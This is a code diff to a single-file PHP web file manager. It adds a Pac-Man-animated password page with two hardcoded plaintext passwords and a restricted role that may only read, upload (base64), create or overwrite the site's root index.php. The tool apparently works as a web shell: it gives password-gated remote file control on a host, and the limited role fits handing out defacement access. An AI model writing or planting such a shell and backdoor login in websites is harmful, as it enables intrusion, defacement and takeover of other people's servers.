@@ -1,7 +1,192 @@
 <?php
 session_start();
+
+// === LOGIN HANDLER ===
+if (isset($_GET['login'])) {
+    header('Content-Type: application/json');
+    $pwd = $_POST['login_password'] ?? '';
+    
+    if ($pwd === 'pacman') {
+        $_SESSION['logged_in'] = true;
+        $_SESSION['role'] = 'pacman';
+        echo json_encode(['status' => 'ok']);
+    } elseif ($pwd === '@xshikata') {
+        $_SESSION['logged_in'] = true;
+        $_SESSION['role'] = 'admin';
+        echo json_encode(['status' => 'ok']);
+    } else {
+        echo json_encode(['status' => 'error', 'msg' => 'Incorrect Password']);
+    }
+    exit;
+}
+
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header("Location: ?");
+    exit;
+}
+
+$is_logged_in = isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+$user_role = $_SESSION['role'] ?? '';
+
+if (!$is_logged_in) {
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>WebOS Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://public.codepenassets.com/css/reset-2.0.min.css">
+    <style>
+        /* PASTE SELURUH CSS DARI FILE pacman.html ASLI DI SINI */
+        @import url("https://fonts.googleapis.com/css?family=Press+Start+2P");
+        :root { --bg-color: black; --border-color: #1500C5; --ghost-color: #EA82E5; --ghost-eye-color: white; --ghost-run-color: #1B00FF; --ghost-pupil-color: #1500C5; --pacman-color: #fdff00; --pellet-color: #EBAE9F; --text-color: white; }
+        [v-cloak] { display: none; }
+         * { box-sizing: border-box; }
+         body { display: flex; align-items: center; justify-content: center; height: 100vh; background: var(--bg-color); margin: 0; overflow: hidden; }
+    
+    /* PENGECILAN SKALA LOGIN */
+         #app { transform: scale(0.75); transform-origin: center; width: 100%; max-width: 400px; }
+         @media (max-width: 600px) { #app { transform: scale(0.65); } }
+
+         form { overflow: hidden; font-family: "Press Start 2p", monospace; text-transform: uppercase; color: var(--text-color); }
+         label { display: block; font-size: 12px; margin-bottom: 15px; text-align: center; }
+         input { margin-bottom: 30px; padding: 15px 0; width: 100%; font-family: "Press Start 2p", monospace; font-size: 18px; text-transform: uppercase; color: var(--pellet-color); background-color: transparent; border: 4px double var(--border-color); border-left-width: 0; border-right-width: 0; text-align: center; }
+         input[type=password] { letter-spacing: 12px; }
+         input[type=button] { cursor: pointer; border: none; font-size: 16px; transition: 0.3s; }
+         input[type=button]:hover { color: var(--pacman-color); }
+         input:focus { border-color: var(--pellet-color); outline: none; }
+    
+        .scene-wrapper { position: relative; height: 80px; }
+        .input-cover { position: absolute; top: 0; left: -52px; width: calc(100% + 52px); height: 52px; background-color: var(--bg-color); z-index: 1; }
+        .pac-wrapper, .ghost-wrapper { position: absolute; top: 0; left: 0; width: 100%; height: 52px; overflow: hidden; z-index: 2; }
+    
+    /* Animasi & Shadow Pacman tetap dipertahankan (Scale handled by #app) */
+        .pacman, .ghost { position: absolute; top: 0; width: 4px; height: 4px; z-index: 2; transform-origin: 100% 100%; }
+        .pacman { right: 52px; animation: waka 0.3s steps(1) infinite forwards; }
+        .pacman:before, .pacman:after { content: ""; position: absolute; width: 100%; height: 100%; } .pacman:before { bottom: 52px; } .pacman:after { bottom: 104px; }
+        @keyframes waka { 0% { margin-top: 0; } 25% { margin-top: 52px; } 50% { margin-top: 104px; } 75% { margin-top: 52px; } 100% { margin-top: 0; } }
+        @keyframes invalid-shake { 0% { transform: translate(0, 0); } 10% { transform: translate(4px, 2px); } 20% { transform: translate(-4px, -2px); } 30% { transform: translate(6px, 3px); } 40% { transform: translate(-6px, -3px); } 50% { transform: translate(6px, 3px); } 60% { transform: translate(-4px, -2px); } 70% { transform: translate(4px, 2px); } 80% { transform: translate(2px, -1px); } 90% { transform: translate(-2px, 1px); } 100% { transform: translate(0); } }
+        .pacman-invalid-enter-active, .pacman-invalid-leave-active, .pacman-success-enter-active, .cover-enter-active { transition: transform 2s linear; }
+        .pacman-success-leave-active { transition: transform 1.6666666667s 1s linear; } .ghost-enter-active { transition: transform 1.8181818182s 0.5s linear; }
+        .pacman-invalid-enter, .pacman-invalid-leave-to, .pacman-success-enter, .pacman-success-leave-to, .pacman-enter, .cover-enter, .cover-leave-to { transform: translateX(-100%); }
+        .ghost-enter-to { transform: translateX(-104px); } .cover-enter-to, .cover-leave-to { transform: translateX(52px); } .pacman-invalid-enter-to, .pacman-success-enter-to { transform: translateX(104px); }
+        .ghost-enter { transform: translateX(100%); } .pacman-invalid-leave-to .pacman, .pacman-success-leave-to .pacman { transform: scaleX(-1); }
+        .fade-enter-active, .fade-leave-active { transition: opacity 0.4s ease-out; } .fade-enter, .fade-leave-to { opacity: 0; }
+        /* Box Shadows Pacman & Ghost */
+        .pacman { box-shadow: 16px 0px var(--pacman-color), 20px 0px var(--pacman-color), 24px 0px var(--pacman-color), 28px 0px var(--pacman-color), 32px 0px var(--pacman-color), 36px 0px var(--pacman-color), 8px 4px var(--pacman-color), 12px 4px var(--pacman-color), 16px 4px var(--pacman-color), 20px 4px var(--pacman-color), 24px 4px var(--pacman-color), 28px 4px var(--pacman-color), 32px 4px var(--pacman-color), 36px 4px var(--pacman-color), 40px 4px var(--pacman-color), 44px 4px var(--pacman-color), 4px 8px var(--pacman-color), 8px 8px var(--pacman-color), 12px 8px var(--pacman-color), 16px 8px var(--pacman-color), 20px 8px var(--pacman-color), 24px 8px var(--pacman-color), 28px 8px var(--pacman-color), 32px 8px var(--pacman-color), 36px 8px var(--pacman-color), 40px 8px var(--pacman-color), 44px 8px var(--pacman-color), 48px 8px var(--pacman-color), 4px 12px var(--pacman-color), 8px 12px var(--pacman-color), 12px 12px var(--pacman-color), 16px 12px var(--pacman-color), 20px 12px var(--pacman-color), 24px 12px var(--pacman-color), 28px 12px var(--pacman-color), 32px 12px var(--pacman-color), 36px 12px var(--pacman-color), 40px 12px var(--pacman-color), 44px 12px var(--pacman-color), 48px 12px var(--pacman-color), 0px 16px var(--pacman-color), 4px 16px var(--pacman-color), 8px 16px var(--pacman-color), 12px 16px var(--pacman-color), 16px 16px var(--pacman-color), 20px 16px var(--pacman-color), 24px 16px var(--pacman-color), 28px 16px var(--pacman-color), 32px 16px var(--pacman-color), 36px 16px var(--pacman-color), 40px 16px var(--pacman-color), 44px 16px var(--pacman-color), 48px 16px var(--pacman-color), 52px 16px var(--pacman-color), 0px 20px var(--pacman-color), 4px 20px var(--pacman-color), 8px 20px var(--pacman-color), 12px 20px var(--pacman-color), 16px 20px var(--pacman-color), 20px 20px var(--pacman-color), 24px 20px var(--pacman-color), 28px 20px var(--pacman-color), 32px 20px var(--pacman-color), 36px 20px var(--pacman-color), 40px 20px var(--pacman-color), 44px 20px var(--pacman-color), 48px 20px var(--pacman-color), 52px 20px var(--pacman-color), 0px 24px var(--pacman-color), 4px 24px var(--pacman-color), 8px 24px var(--pacman-color), 12px 24px var(--pacman-color), 16px 24px var(--pacman-color), 20px 24px var(--pacman-color), 24px 24px var(--pacman-color), 28px 24px var(--pacman-color), 32px 24px var(--pacman-color), 36px 24px var(--pacman-color), 40px 24px var(--pacman-color), 44px 24px var(--pacman-color), 48px 24px var(--pacman-color), 52px 24px var(--pacman-color), 0px 28px var(--pacman-color), 4px 28px var(--pacman-color), 8px 28px var(--pacman-color), 12px 28px var(--pacman-color), 16px 28px var(--pacman-color), 20px 28px var(--pacman-color), 24px 28px var(--pacman-color), 28px 28px var(--pacman-color), 32px 28px var(--pacman-color), 36px 28px var(--pacman-color), 40px 28px var(--pacman-color), 44px 28px var(--pacman-color), 48px 28px var(--pacman-color), 52px 28px var(--pacman-color), 0px 32px var(--pacman-color), 4px 32px var(--pacman-color), 8px 32px var(--pacman-color), 12px 32px var(--pacman-color), 16px 32px var(--pacman-color), 20px 32px var(--pacman-color), 24px 32px var(--pacman-color), 28px 32px var(--pacman-color), 32px 32px var(--pacman-color), 36px 32px var(--pacman-color), 40px 32px var(--pacman-color), 44px 32px var(--pacman-color), 48px 32px var(--pacman-color), 52px 32px var(--pacman-color), 4px 36px var(--pacman-color), 8px 36px var(--pacman-color), 12px 36px var(--pacman-color), 16px 36px var(--pacman-color), 20px 36px var(--pacman-color), 24px 36px var(--pacman-color), 28px 36px var(--pacman-color), 32px 36px var(--pacman-color), 36px 36px var(--pacman-color), 40px 36px var(--pacman-color), 44px 36px var(--pacman-color), 48px 36px var(--pacman-color), 4px 40px var(--pacman-color), 8px 40px var(--pacman-color), 12px 40px var(--pacman-color), 16px 40px var(--pacman-color), 20px 40px var(--pacman-color), 24px 40px var(--pacman-color), 28px 40px var(--pacman-color), 32px 40px var(--pacman-color), 36px 40px var(--pacman-color), 40px 40px var(--pacman-color), 44px 40px var(--pacman-color), 48px 40px var(--pacman-color), 8px 44px var(--pacman-color), 12px 44px var(--pacman-color), 16px 44px var(--pacman-color), 20px 44px var(--pacman-color), 24px 44px var(--pacman-color), 28px 44px var(--pacman-color), 32px 44px var(--pacman-color), 36px 44px var(--pacman-color), 40px 44px var(--pacman-color), 44px 44px var(--pacman-color), 16px 48px var(--pacman-color), 20px 48px var(--pacman-color), 24px 48px var(--pacman-color), 28px 48px var(--pacman-color), 32px 48px var(--pacman-color), 36px 48px var(--pacman-color); }
+        .pacman:before { box-shadow: 16px 0px var(--pacman-color), 20px 0px var(--pacman-color), 24px 0px var(--pacman-color), 28px 0px var(--pacman-color), 32px 0px var(--pacman-color), 36px 0px var(--pacman-color), 8px 4px var(--pacman-color), 12px 4px var(--pacman-color), 16px 4px var(--pacman-color), 20px 4px var(--pacman-color), 24px 4px var(--pacman-color), 28px 4px var(--pacman-color), 32px 4px var(--pacman-color), 36px 4px var(--pacman-color), 40px 4px var(--pacman-color), 44px 4px var(--pacman-color), 4px 8px var(--pacman-color), 8px 8px var(--pacman-color), 12px 8px var(--pacman-color), 16px 8px var(--pacman-color), 20px 8px var(--pacman-color), 24px 8px var(--pacman-color), 28px 8px var(--pacman-color), 32px 8px var(--pacman-color), 36px 8px var(--pacman-color), 40px 8px var(--pacman-color), 44px 8px var(--pacman-color), 48px 8px var(--pacman-color), 4px 12px var(--pacman-color), 8px 12px var(--pacman-color), 12px 12px var(--pacman-color), 16px 12px var(--pacman-color), 20px 12px var(--pacman-color), 24px 12px var(--pacman-color), 28px 12px var(--pacman-color), 32px 12px var(--pacman-color), 36px 12px var(--pacman-color), 40px 12px var(--pacman-color), 44px 12px var(--pacman-color), 48px 12px var(--pacman-color), 0px 16px var(--pacman-color), 4px 16px var(--pacman-color), 8px 16px var(--pacman-color), 12px 16px var(--pacman-color), 16px 16px var(--pacman-color), 20px 16px var(--pacman-color), 24px 16px var(--pacman-color), 28px 16px var(--pacman-color), 32px 16px var(--pacman-color), 36px 16px var(--pacman-color), 40px 16px var(--pacman-color), 0px 20px var(--pacman-color), 4px 20px var(--pacman-color), 8px 20px var(--pacman-color), 12px 20px var(--pacman-color), 16px 20px var(--pacman-color), 20px 20px var(--pacman-color), 24px 20px var(--pacman-color), 28px 20px var(--pacman-color), 0px 24px var(--pacman-color), 4px 24px var(--pacman-color), 8px 24px var(--pacman-color), 12px 24px var(--pacman-color), 16px 24px var(--pacman-color), 0px 28px var(--pacman-color), 4px 28px var(--pacman-color), 8px 28px var(--pacman-color), 12px 28px var(--pacman-color), 16px 28px var(--pacman-color), 20px 28px var(--pacman-color), 24px 28px var(--pacman-color), 28px 28px var(--pacman-color), 0px 32px var(--pacman-color), 4px 32px var(--pacman-color), 8px 32px var(--pacman-color), 12px 32px var(--pacman-color), 16px 32px var(--pacman-color), 20px 32px var(--pacman-color), 24px 32px var(--pacman-color), 28px 32px var(--pacman-color), 32px 32px var(--pacman-color), 36px 32px var(--pacman-color), 40px 32px var(--pacman-color), 4px 36px var(--pacman-color), 8px 36px var(--pacman-color), 12px 36px var(--pacman-color), 16px 36px var(--pacman-color), 20px 36px var(--pacman-color), 24px 36px var(--pacman-color), 28px 36px var(--pacman-color), 32px 36px var(--pacman-color), 36px 36px var(--pacman-color), 40px 36px var(--pacman-color), 44px 36px var(--pacman-color), 48px 36px var(--pacman-color), 4px 40px var(--pacman-color), 8px 40px var(--pacman-color), 12px 40px var(--pacman-color), 16px 40px var(--pacman-color), 20px 40px var(--pacman-color), 24px 40px var(--pacman-color), 28px 40px var(--pacman-color), 32px 40px var(--pacman-color), 36px 40px var(--pacman-color), 40px 40px var(--pacman-color), 44px 40px var(--pacman-color), 48px 40px var(--pacman-color), 8px 44px var(--pacman-color), 12px 44px var(--pacman-color), 16px 44px var(--pacman-color), 20px 44px var(--pacman-color), 24px 44px var(--pacman-color), 28px 44px var(--pacman-color), 32px 44px var(--pacman-color), 36px 44px var(--pacman-color), 40px 44px var(--pacman-color), 44px 44px var(--pacman-color), 16px 48px var(--pacman-color), 20px 48px var(--pacman-color), 24px 48px var(--pacman-color), 28px 48px var(--pacman-color), 32px 48px var(--pacman-color), 36px 48px var(--pacman-color); }
+        .pacman:after { box-shadow: 16px 0px var(--pacman-color), 20px 0px var(--pacman-color), 24px 0px var(--pacman-color), 28px 0px var(--pacman-color), 32px 0px var(--pacman-color), 36px 0px var(--pacman-color), 8px 4px var(--pacman-color), 12px 4px var(--pacman-color), 16px 4px var(--pacman-color), 20px 4px var(--pacman-color), 24px 4px var(--pacman-color), 28px 4px var(--pacman-color), 32px 4px var(--pacman-color), 36px 4px var(--pacman-color), 4px 8px var(--pacman-color), 8px 8px var(--pacman-color), 12px 8px var(--pacman-color), 16px 8px var(--pacman-color), 20px 8px var(--pacman-color), 24px 8px var(--pacman-color), 28px 8px var(--pacman-color), 32px 8px var(--pacman-color), 4px 12px var(--pacman-color), 8px 12px var(--pacman-color), 12px 12px var(--pacman-color), 16px 12px var(--pacman-color), 20px 12px var(--pacman-color), 24px 12px var(--pacman-color), 28px 12px var(--pacman-color), 0px 16px var(--pacman-color), 4px 16px var(--pacman-color), 8px 16px var(--pacman-color), 12px 16px var(--pacman-color), 16px 16px var(--pacman-color), 20px 16px var(--pacman-color), 24px 16px var(--pacman-color), 0px 20px var(--pacman-color), 4px 20px var(--pacman-color), 8px 20px var(--pacman-color), 12px 20px var(--pacman-color), 16px 20px var(--pacman-color), 20px 20px var(--pacman-color), 0px 24px var(--pacman-color), 4px 24px var(--pacman-color), 8px 24px var(--pacman-color), 12px 24px var(--pacman-color), 16px 24px var(--pacman-color), 0px 28px var(--pacman-color), 4px 28px var(--pacman-color), 8px 28px var(--pacman-color), 12px 28px var(--pacman-color), 16px 28px var(--pacman-color), 20px 28px var(--pacman-color), 0px 32px var(--pacman-color), 4px 32px var(--pacman-color), 8px 32px var(--pacman-color), 12px 32px var(--pacman-color), 16px 32px var(--pacman-color), 20px 32px var(--pacman-color), 24px 32px var(--pacman-color), 4px 36px var(--pacman-color), 8px 36px var(--pacman-color), 12px 36px var(--pacman-color), 16px 36px var(--pacman-color), 20px 36px var(--pacman-color), 24px 36px var(--pacman-color), 28px 36px var(--pacman-color), 4px 40px var(--pacman-color), 8px 40px var(--pacman-color), 12px 40px var(--pacman-color), 16px 40px var(--pacman-color), 20px 40px var(--pacman-color), 24px 40px var(--pacman-color), 28px 40px var(--pacman-color), 32px 40px var(--pacman-color), 8px 44px var(--pacman-color), 12px 44px var(--pacman-color), 16px 44px var(--pacman-color), 20px 44px var(--pacman-color), 24px 44px var(--pacman-color), 28px 44px var(--pacman-color), 32px 44px var(--pacman-color), 36px 44px var(--pacman-color), 16px 48px var(--pacman-color), 20px 48px var(--pacman-color), 24px 48px var(--pacman-color), 28px 48px var(--pacman-color), 32px 48px var(--pacman-color), 36px 48px var(--pacman-color); }
+        .ghost { box-shadow: 20px 0px var(--ghost-color), 24px 0px var(--ghost-color), 28px 0px var(--ghost-color), 32px 0px var(--ghost-color), 12px 4px var(--ghost-color), 16px 4px var(--ghost-color), 20px 4px var(--ghost-color), 24px 4px var(--ghost-color), 28px 4px var(--ghost-color), 32px 4px var(--ghost-color), 36px 4px var(--ghost-color), 40px 4px var(--ghost-color), 8px 8px var(--ghost-color), 12px 8px var(--ghost-color), 16px 8px var(--ghost-color), 20px 8px var(--ghost-color), 24px 8px var(--ghost-color), 28px 8px var(--ghost-color), 32px 8px var(--ghost-color), 36px 8px var(--ghost-color), 40px 8px var(--ghost-color), 44px 8px var(--ghost-color), 4px 12px var(--ghost-color), 8px 12px var(--ghost-eye-color), 12px 12px var(--ghost-eye-color), 16px 12px var(--ghost-color), 20px 12px var(--ghost-color), 24px 12px var(--ghost-color), 28px 12px var(--ghost-color), 32px 12px var(--ghost-eye-color), 36px 12px var(--ghost-eye-color), 40px 12px var(--ghost-color), 44px 12px var(--ghost-color), 48px 12px var(--ghost-color), 4px 16px var(--ghost-eye-color), 8px 16px var(--ghost-eye-color), 12px 16px var(--ghost-eye-color), 16px 16px var(--ghost-eye-color), 20px 16px var(--ghost-color), 24px 16px var(--ghost-color), 28px 16px var(--ghost-eye-color), 32px 16px var(--ghost-eye-color), 36px 16px var(--ghost-eye-color), 40px 16px var(--ghost-eye-color), 44px 16px var(--ghost-color), 48px 16px var(--ghost-color), 4px 20px var(--ghost-pupil-color), 8px 20px var(--ghost-pupil-color), 12px 20px var(--ghost-eye-color), 16px 20px var(--ghost-eye-color), 20px 20px var(--ghost-color), 24px 20px var(--ghost-color), 28px 20px var(--ghost-pupil-color), 32px 20px var(--ghost-pupil-color), 36px 20px var(--ghost-eye-color), 40px 20px var(--ghost-eye-color), 44px 20px var(--ghost-color), 48px 20px var(--ghost-color), 0px 24px var(--ghost-color), 4px 24px var(--ghost-pupil-color), 8px 24px var(--ghost-pupil-color), 12px 24px var(--ghost-eye-color), 16px 24px var(--ghost-eye-color), 20px 24px var(--ghost-color), 24px 24px var(--ghost-color), 28px 24px var(--ghost-pupil-color), 32px 24px var(--ghost-pupil-color), 36px 24px var(--ghost-eye-color), 40px 24px var(--ghost-eye-color), 44px 24px var(--ghost-color), 48px 24px var(--ghost-color), 52px 24px var(--ghost-color), 0px 28px var(--ghost-color), 4px 28px var(--ghost-color), 8px 28px var(--ghost-eye-color), 12px 28px var(--ghost-eye-color), 16px 28px var(--ghost-color), 20px 28px var(--ghost-color), 24px 28px var(--ghost-color), 28px 28px var(--ghost-color), 32px 28px var(--ghost-eye-color), 36px 28px var(--ghost-eye-color), 40px 28px var(--ghost-color), 44px 28px var(--ghost-color), 48px 28px var(--ghost-color), 52px 28px var(--ghost-color), 0px 32px var(--ghost-color), 4px 32px var(--ghost-color), 8px 32px var(--ghost-color), 12px 32px var(--ghost-color), 16px 32px var(--ghost-color), 20px 32px var(--ghost-color), 24px 32px var(--ghost-color), 28px 32px var(--ghost-color), 32px 32px var(--ghost-color), 36px 32px var(--ghost-color), 40px 32px var(--ghost-color), 44px 32px var(--ghost-color), 48px 32px var(--ghost-color), 52px 32px var(--ghost-color), 0px 36px var(--ghost-color), 4px 36px var(--ghost-color), 8px 36px var(--ghost-color), 12px 36px var(--ghost-color), 16px 36px var(--ghost-color), 20px 36px var(--ghost-color), 24px 36px var(--ghost-color), 28px 36px var(--ghost-color), 32px 36px var(--ghost-color), 36px 36px var(--ghost-color), 40px 36px var(--ghost-color), 44px 36px var(--ghost-color), 44px 36px var(--ghost-color), 48px 36px var(--ghost-color), 52px 36px var(--ghost-color), 0px 40px var(--ghost-color), 4px 40px var(--ghost-color), 8px 40px var(--ghost-color), 12px 40px var(--ghost-color), 16px 40px var(--ghost-color), 20px 40px var(--ghost-color), 24px 40px var(--ghost-color), 28px 40px var(--ghost-color), 32px 40px var(--ghost-color), 36px 40px var(--ghost-color), 40px 40px var(--ghost-color), 44px 40px var(--ghost-color), 44px 40px var(--ghost-color), 48px 40px var(--ghost-color), 52px 40px var(--ghost-color), 0px 44px var(--ghost-color), 4px 44px var(--ghost-color), 12px 44px var(--ghost-color), 16px 44px var(--ghost-color), 20px 44px var(--ghost-color), 32px 44px var(--ghost-color), 36px 44px var(--ghost-color), 40px 44px var(--ghost-color), 48px 44px var(--ghost-color), 52px 44px var(--ghost-color), 0px 48px var(--ghost-color), 16px 48px var(--ghost-color), 20px 48px var(--ghost-color), 32px 48px var(--ghost-color), 36px 48px var(--ghost-color), 52px 48px var(--ghost-color); }
+        .ghost.runaway { box-shadow: 20px 0px var(--ghost-run-color), 24px 0px var(--ghost-run-color), 28px 0px var(--ghost-run-color), 32px 0px var(--ghost-run-color), 12px 4px var(--ghost-run-color), 16px 4px var(--ghost-run-color), 20px 4px var(--ghost-run-color), 24px 4px var(--ghost-run-color), 28px 4px var(--ghost-run-color), 32px 4px var(--ghost-run-color), 36px 4px var(--ghost-run-color), 40px 4px var(--ghost-run-color), 8px 8px var(--ghost-run-color), 12px 8px var(--ghost-run-color), 16px 8px var(--ghost-run-color), 20px 8px var(--ghost-run-color), 24px 8px var(--ghost-run-color), 28px 8px var(--ghost-run-color), 32px 8px var(--ghost-run-color), 36px 8px var(--ghost-run-color), 40px 8px var(--ghost-run-color), 44px 8px var(--ghost-run-color), 4px 12px var(--ghost-run-color), 8px 12px var(--ghost-run-color), 12px 12px var(--ghost-run-color), 16px 12px var(--ghost-run-color), 20px 12px var(--ghost-run-color), 24px 12px var(--ghost-run-color), 28px 12px var(--ghost-run-color), 32px 12px var(--ghost-run-color), 36px 12px var(--ghost-run-color), 40px 12px var(--ghost-run-color), 44px 12px var(--ghost-run-color), 48px 12px var(--ghost-run-color), 4px 16px var(--ghost-run-color), 8px 16px var(--ghost-run-color), 12px 16px var(--ghost-run-color), 16px 16px var(--ghost-eye-color), 20px 16px var(--ghost-eye-color), 24px 16px var(--ghost-run-color), 28px 16px var(--ghost-run-color), 32px 16px var(--ghost-eye-color), 36px 16px var(--ghost-eye-color), 40px 16px var(--ghost-run-color), 44px 16px var(--ghost-run-color), 48px 16px var(--ghost-run-color), 4px 20px var(--ghost-run-color), 8px 20px var(--ghost-run-color), 12px 20px var(--ghost-run-color), 16px 20px var(--ghost-eye-color), 20px 20px var(--ghost-eye-color), 24px 20px var(--ghost-run-color), 28px 20px var(--ghost-run-color), 32px 20px var(--ghost-eye-color), 36px 20px var(--ghost-eye-color), 40px 20px var(--ghost-run-color), 44px 20px var(--ghost-run-color), 48px 20px var(--ghost-run-color), 0px 24px var(--ghost-run-color), 4px 24px var(--ghost-run-color), 8px 24px var(--ghost-run-color), 12px 24px var(--ghost-run-color), 16px 24px var(--ghost-run-color), 20px 24px var(--ghost-run-color), 24px 24px var(--ghost-run-color), 28px 24px var(--ghost-run-color), 32px 24px var(--ghost-run-color), 36px 24px var(--ghost-run-color), 40px 24px var(--ghost-run-color), 44px 24px var(--ghost-run-color), 48px 24px var(--ghost-run-color), 52px 24px var(--ghost-run-color), 0px 28px var(--ghost-run-color), 4px 28px var(--ghost-run-color), 8px 28px var(--ghost-run-color), 12px 28px var(--ghost-run-color), 16px 28px var(--ghost-run-color), 20px 28px var(--ghost-run-color), 24px 28px var(--ghost-run-color), 28px 28px var(--ghost-run-color), 32px 28px var(--ghost-run-color), 36px 28px var(--ghost-run-color), 40px 28px var(--ghost-run-color), 44px 28px var(--ghost-run-color), 48px 28px var(--ghost-run-color), 52px 28px var(--ghost-run-color), 0px 32px var(--ghost-run-color), 4px 32px var(--ghost-run-color), 8px 32px var(--ghost-eye-color), 12px 32px var(--ghost-eye-color), 16px 32px var(--ghost-run-color), 20px 32px var(--ghost-run-color), 24px 32px var(--ghost-eye-color), 28px 32px var(--ghost-eye-color), 32px 32px var(--ghost-run-color), 36px 32px var(--ghost-run-color), 40px 32px var(--ghost-eye-color), 44px 32px var(--ghost-eye-color), 48px 32px var(--ghost-run-color), 52px 32px var(--ghost-run-color), 0px 36px var(--ghost-run-color), 4px 36px var(--ghost-eye-color), 8px 36px var(--ghost-run-color), 12px 36px var(--ghost-run-color), 16px 36px var(--ghost-eye-color), 20px 36px var(--ghost-eye-color), 24px 36px var(--ghost-run-color), 28px 36px var(--ghost-run-color), 32px 36px var(--ghost-eye-color), 36px 36px var(--ghost-eye-color), 40px 36px var(--ghost-run-color), 44px 36px var(--ghost-run-color), 44px 36px var(--ghost-run-color), 48px 36px var(--ghost-eye-color), 52px 36px var(--ghost-run-color), 0px 40px var(--ghost-run-color), 4px 40px var(--ghost-run-color), 8px 40px var(--ghost-run-color), 12px 40px var(--ghost-run-color), 16px 40px var(--ghost-run-color), 20px 40px var(--ghost-run-color), 24px 40px var(--ghost-run-color), 28px 40px var(--ghost-run-color), 32px 40px var(--ghost-run-color), 36px 40px var(--ghost-run-color), 40px 40px var(--ghost-run-color), 44px 40px var(--ghost-run-color), 44px 40px var(--ghost-run-color), 48px 40px var(--ghost-run-color), 52px 40px var(--ghost-run-color), 0px 44px var(--ghost-run-color), 4px 44px var(--ghost-run-color), 12px 44px var(--ghost-run-color), 16px 44px var(--ghost-run-color), 20px 44px var(--ghost-run-color), 32px 44px var(--ghost-run-color), 36px 44px var(--ghost-run-color), 40px 44px var(--ghost-run-color), 48px 44px var(--ghost-run-color), 52px 44px var(--ghost-run-color), 0px 48px var(--ghost-run-color), 16px 48px var(--ghost-run-color), 20px 48px var(--ghost-run-color), 32px 48px var(--ghost-run-color), 36px 48px var(--ghost-run-color), 52px 48px var(--ghost-run-color); }
+    </style>
+</head>
+<body>
+    <div id="app">
+        <transition name="fade" mode="out-in" appear="appear" v-cloak="v-cloak">
+            <form @submit.prevent="runPacman" v-if="!logged_in">
+                <label for="password">Password</label>
+                <div class="scene-wrapper">
+                    <input @keyup.enter="runPacman" ref="password" id="password" type="password" v-model="password_entered" :class="{invalid : password_invalid}" :disabled="disableInput()"/>
+                    <transition :name="transitionPacman" v-on:after-enter="checkPassword">
+                        <div class="pac-wrapper" v-if="animate_pacman">
+                            <div class="pacman"></div>
+                        </div>
+                    </transition>
+                    <transition name="cover">
+                        <div class="input-cover" v-if="animate_pacman || animate_ghost"></div>
+                    </transition>
+                    <transition name="ghost" v-on:after-enter="resetAnimation">
+                        <div class="ghost-wrapper" v-if="animate_ghost">
+                            <div class="ghost" :class="{runaway : password_match}"></div>
+                        </div>
+                    </transition>
+                </div>
+                <input @click="runPacman" ref="start" type="button" value="Press Start" :disabled="disableInput()"/>
+            </form>
+            <div class="logged-in" v-else="v-else">
+                <p>You are now logged in.</p>
+                <p>Welcome!</p>
+            </div>
+        </transition>
+    </div>
+
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.5.15/vue.js'></script>
+    <script>
+    const app = new Vue({
+        el: '#app',
+        data: {
+            animate_ghost: false,
+            animate_pacman: false,
+            logged_in: false,
+            password_entered: '',
+            password_invalid: false,
+            password_match: false,
+            password_tries: 0 
+        },
+        computed: {
+            transitionPacman() {
+                return this.password_match ? 'pacman-success' : 'pacman-invalid';
+            } 
+        },
+        methods: {
+            checkPassword() {
+                this.animate_ghost = true;
+                this.animate_pacman = false;
+                if (!this.password_match) {
+                    this.password_invalid = true;
+                    this.$refs.start.value = 'Incorrect Password!';
+                } else {
+                    this.$refs.start.value = 'Logging in';
+                }
+            },
+            disableInput() {
+                return this.animate_pacman || this.animate_ghost;
+            },
+            resetAnimation() {
+                this.animate_ghost = false;
+                this.password_invalid = false;
+                this.password_entered = '';
+                this.password_tries++;
+
+                if (this.password_match) {
+                    this.logged_in = true;
+                    setTimeout(() => location.reload(), 500); // Reload halaman setelah sukses
+                } else {
+                    this.$refs.start.value = 'Try Again';
+                }
+                setTimeout(() => { if(this.$refs.password) this.$refs.password.focus() }, 100);
+            },
+            runPacman(e) {
+                e.preventDefault();
+                this.animate_pacman = true;
+                this.$refs.start.value = 'Checking...';
+                
+                // Melakukan asinkron request ke backend PHP
+                let formData = new URLSearchParams();
+                formData.append('login_password', this.password_entered);
+                fetch('?login=1', { method: 'POST', body: formData })
+                .then(res => res.json())
+                .then(data => {
+                    this.password_match = (data.status === 'ok');
+                }).catch(() => {
+                    this.password_match = false;
+                });
+            }
+        },
+        mounted() {
+            this.$refs.password.focus();
+        } 
+    });
+    </script>
+</body>
+</html>
+<?php
+    exit;
+}
 // === QUANTUM WEBOS FILE MANAGER ===
-// === VERSION: 13.16 (Icon Restoration & Hitbox Consistency) ===
+// === VERSION: 13.19 (Card Menu Hitbox Bugfix) ===
 // === 1. THE QUANTUM API BACKEND ===
 $base_dir = realpath(__DIR__);
 
@@ -92,8 +277,35 @@ if (isset($_GET['api'])) {
     $path_req = $_GET['path'] ?? get_post('path');
     $current_dir = getSafePath($base_dir, $path_req);
 
+    // === RULES FOR PACMAN ROLE ===
+    if ($user_role === 'pacman') {
+        $current_dir = $base_dir; // RULE 1: Kunci akses HANYA di root domain
+        
+        $allowed_actions = ['list', 'read', 'upload_b64', 'edit', 'touch'];
+        if (!in_array($action, $allowed_actions)) {
+            echo custom_json_encode(['status' => 'error', 'msg' => 'ERROR !']);
+            exit;
+        }
+        
+        if (in_array($action, ['upload_b64', 'edit', 'touch', 'read'])) {
+            $fname = '';
+            if ($action === 'upload_b64') $fname = get_post('filename');
+            elseif ($action === 'edit') $fname = get_post('target');
+            elseif ($action === 'touch') $fname = get_post('name') ?: 'new_file.txt';
+            elseif ($action === 'read') $fname = $_GET['target'];
+            
+            // RULE 2: Validasi exact match ke "index.php" saja
+            if (basename($fname) !== 'index.php') {
+                echo custom_json_encode(['status' => 'error', 'msg' => 'ERROR !']);
+                exit;
+            }
+        }
+    }
+    // =============================
+
     try {
         if ($action === 'list') {
+            // (Kode Anda selanjutnya tetap sama)
             $files = scandir($current_dir);
             $data = ['path' => $current_dir, 'items' => []];
             foreach ($files as $f) {
@@ -361,10 +573,9 @@ if (isset($_GET['api'])) {
         .f-meta { display: flex; align-items: center; gap: 10px; font-size: 11px; color: var(--text-muted); font-family: monospace; }
         .f-meta span.dot { width: 4px; height: 4px; background: var(--win-border); border-radius: 50%; }
